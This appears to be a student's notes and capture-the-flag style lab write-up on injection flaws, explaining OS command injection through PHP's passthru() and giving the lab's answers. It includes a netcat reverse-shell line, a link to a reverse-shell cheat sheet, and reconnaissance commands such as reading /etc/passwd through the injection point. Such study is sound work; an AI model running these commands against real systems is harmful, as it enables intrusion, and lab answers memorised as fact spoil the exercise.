# Injection Vulnerabilities

**Date:** 26, December, 2020

**Author:** Dhilip Sanjay S

---

- Injection flaws occur because user controlled input is interpreted as actual commands or parameters by the application.

## SQL Injection
- Access, Modify and Delte Information in a database.

## OS Command Injection
- Execute arbitrary system commands on a server that would allow an attacker to gain access to users' system.
- Can be used to open up a reverse shell.
    ```bash
    nc -e /bin/bash
    ```
- [Pentest Monkey Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- Types:
    - **Blind Command Injection** - when the system command made to the server does not return the response to the user in the HTML document.
    - **Active Command Injection** - return the response to the user.  It can be made visible through several HTML elements.

## Preventing Injection Attacks
- Using an allow list (white list)
- Stripping input (that contains dangerous characters)

**Note:** There are various libraries that perform these tasks.

---

## Command Injection Practical
- PHP `passthru()` function - executes what gets entered into the input, then passsing the output directly to the browser.
- [passthru() Documentation](https://www.php.net/manual/en/function.passthru.php)
- **Warning:** When allowing user-supplied data to be passed to this function, use `escapeshellarg()` or `escapeshellcmd()` to ensure that users cannot trick the system into executing arbitrary commands.

- **Ways to Detect Active Command Injection**
    - Linux
        ```bash
        whoami
        id
        ifconfig/ip addr
        uname -a
        ps -ef
        ```
    - Windows
        ```powershell
        whoami
        ver
        ipconfig
        tasklist
        netstat -an
        ```
        
## Solutions

### What strange text file is in the website root directory?
- **Answer:** drpepper.txt 

---

### How many non-root/non-service/non-daemon users are there?
- **Answer:** 0
- **Steps to Reproduce:** 
    ```bash
    cat /etc/passwd | grep home/
    ```
 - The /etc/passwd file is a colon-separated file that contains the following information:
1. **Username:** It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password:** An `x` character indicates that encrypted password is stored in `/etc/shadow` file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file.
3. **User ID (UID):** Each user must be assigned a user ID (UID). **UID 0 (zero) is reserved for root** and **UIDs 1-99 are reserved for other predefined accounts**. Further **UID 100-999 are reserved by system for administrative and system accounts/groups**.
4. **Group ID (GID):** The primary group ID (stored in /etc/group file)
5. **User ID Info:** The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory:** The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell:** The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to `/sbin/nologin` and the user tries to log in to the Linux system directly, the `/sbin/nologin` shell *closes the connection.*
---

### What user is this app running as?
- **Answer:** www-data
- **Steps to Reproduce:** `whoami`

---

### What is the user's shell set as?
- **Answer:** /usr/sbin/nologin 
- **Steps to Reproduce:** 
    ```bash
    cat /etc/passwd | grep www-data

    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
    ``` 
---

### What version of Ubuntu is running?
- **Answer:** 18.04.4
- **Steps to Reproduce:** 
    ```bash
    grep 'VERSION' /etc/*release

    /etc/os-release:VERSION="18.04.4 LTS (Bionic Beaver)" 
    /etc/os-release:VERSION_ID="18.04" 
    /etc/os-release:VERSION_CODENAME=bionic 
    ```
---

### Print out the MOTD.  What favorite beverage is shown?
- **Answer:** DR PEPPER
- **Steps to Reproduce:** 
    - This question took a lot of time for me to solve.
    - On googling what is `motd in linux` : `/etc/motd` is a file on Unix-like systems that contains a "message of the day".
    - So, I entered the command `cat /etc/motd`, but there was no output.
    - Next, I used locate command to find the location of motd : `locate motd`
    ```bash
    /etc/update-motd.d /etc/default/motd-news /etc/systemd/system/timers.target.wants/motd-news.timer /etc/update-motd.d/00-header /etc/update-motd.d/10-help-text /etc/update-motd.d/50-landscape-sysinfo /etc/update-motd.d/50-motd-news /etc/update-motd.d/80-esm /etc/update-motd.d/80-livepatch /etc/update-motd.d/90-updates-available /etc/update-motd.d/91-release-upgrade /etc/update-motd.d/92-unattended-upgrades /etc/update-motd.d/95-hwe-eol /etc/update-motd.d/97-overlayroot /etc/update-motd.d/98-fsck-at-reboot /etc/update-motd.d/98-reboot-required /lib/systemd/system/motd-news.service /lib/systemd/system/motd-news.timer /lib/systemd/system/motd.service /lib/x86_64-linux-gnu/security/pam_motd.so /usr/lib/ubuntu-release-upgrader/release-upgrade-motd /usr/lib/update-notifier/update-motd-fsck-at-reboot /usr/lib/update-notifier/update-motd-hwe-eol /usr/lib/update-notifier/update-motd-reboot-required /usr/lib/update-notifier/update-motd-updates-available /usr/share/base-files/motd /usr/share/doc/util-linux/examples/motd /usr/share/man/man5/motd.5.gz /usr/share/man/man5/update-motd.5.gz /usr/share/man/man8/pam_motd.8.gz /usr/share/unattended-upgrades/update-motd-unattended-upgrades /var/lib/systemd/deb-systemd-helper-enabled/motd-news.timer.dsh-also /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/motd-news.timer 
    ```

    - It seemed like `update-motd.d` was a directory, so I listed the files inside the directory : `ls /etc/update-motd.d`
    ```bash
    00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required 
    ```

    - The hint said `00-header`, so I printed the contents of this file : `cat /etc/update-motd.d/00-header`
    ```bash
    #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)" DR PEPPER MAKES THE WORLD TASTE BETTER! 
    ```
    - The last line was `DR PEPPER MAKES THE WORLD TASTE BETTER!`.
    - As expected `DR PEPPER` was the answer.
---